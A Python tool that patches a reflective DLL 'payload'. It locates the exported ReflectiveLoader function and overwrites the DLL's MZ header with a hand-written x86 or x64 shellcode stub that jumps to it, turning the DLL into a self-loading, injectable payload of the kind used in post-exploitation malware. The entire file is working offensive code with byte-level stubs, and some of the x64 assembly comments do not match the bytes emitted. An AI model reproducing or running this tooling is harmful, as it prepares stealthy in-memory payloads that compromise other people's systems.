# -*- coding:utf-8 -*-

import sys, pefile, struct


def get_file_offset(function_name,pe,pe32):
    rva = ''
    if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):
        for export in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            if function_name in str(export.name):
                rva = export.address
                print("[*] %s export Found! Ord:%s EntryPoint offset: %xh" % (
                export.name, export.ordinal, rva))
                break;

    if not rva:
        print("[!] 无法找到ReflectiveLoader函数")
        sys.exit(1)

    offset_va = rva - pe.get_section_by_rva(rva).VirtualAddress
    offset_file = offset_va + pe.get_section_by_rva(rva).PointerToRawData

    if  pe32:
        # print(offset_file)
        offset_file -= 7
    else:
        # print(offset_file)
        offset_file-=11

    return bytes(struct.pack("<I", offset_file))

def patch_stub(offset_file,pe32):
    if  pe32:
        stub = (
                ##############################x86
                b"\x4D"
                b"\x5A"
                b"\xE8\x00\x00\x00\x00"
                b"\x5B"
                b"\x52"
                b"\x45"
                b"\x55"
                b"\x89\xE5"
                b"\x81\xC3" + offset_file +
                b"\xFF\xD3"
                
                # 4d                 dec ebp
                # 5a                 pop edx
                # e8 00 00 00 00     call 0
                # 5b                 pop ebx
                # 52                 push edx
                # 45                 inc ebp
                # 55                 push ebp
                # 89 e5              mov ebp,esp
                # 81 c3              add ebx, xxxx offset to ReflectiveLoader
                # ff d3              call ebx
                ##############################
                )
    else:
        stub = (
            ##############################x64

                b"\x4D\x5A"
                b"\x41\x52"
                b"\x55"
                b"\x48\x89\xE5"
                b"\xe8\x00\x00\x00\x00"
                b"\x5b"
                b"\x48\x81\xC3" + offset_file +
                b"\xFF\xD3"

                # 41 5a                   pop    r10
                # 41 52                   push   r10
                # 55                      push   rbp
                # 48 89 e5                mov    rbp, rsp
                # 48 83 ec 20             sub    rsp, 0x20
                # e8 00 00 00 00          call   0
                # 5b                      pop    rbx
                # 48 81 c3 37 04 00 00    add    rbx, 0x437
                # ff d3                   call   rbx
            ##############################
        )

    return stub

def ReflectiveDLL_Patch():
    pe32=True
    function_name="ReflectiveLoader"
    if len(sys.argv) == 1:
        print("Usage: ReflectiveDLL_Patch payload.dll x64|x86(可选默认x86)")
        sys.exit(1)
    else:
        if len(sys.argv) == 3:
            if  sys.argv[2]=="x86":
                pass
            else:
                pe32=False

    dll = sys.argv[1]

    try:
        pe = pefile.PE(dll)
        print("[*] %s loaded" % dll )
    except IOError as e:
        print(str(e))
        sys.exit(1)

    offset_file = get_file_offset(function_name,pe,pe32)
    print("[*] offset_file:" + offset_file.hex())

    stub = patch_stub(offset_file,pe32)

    src = open(dll, 'rb')
    payload = src.read()
    reflective_payload = stub + payload[len(stub):]
    patched_dll = "Patch_"+dll
    dst = open(patched_dll, 'wb')
    dst.write(reflective_payload)

    src.close()
    dst.close()
    print("[+] Patched! %s (%d bytes)." % (patched_dll, len(reflective_payload)))



if __name__ == '__main__':
    ReflectiveDLL_Patch()
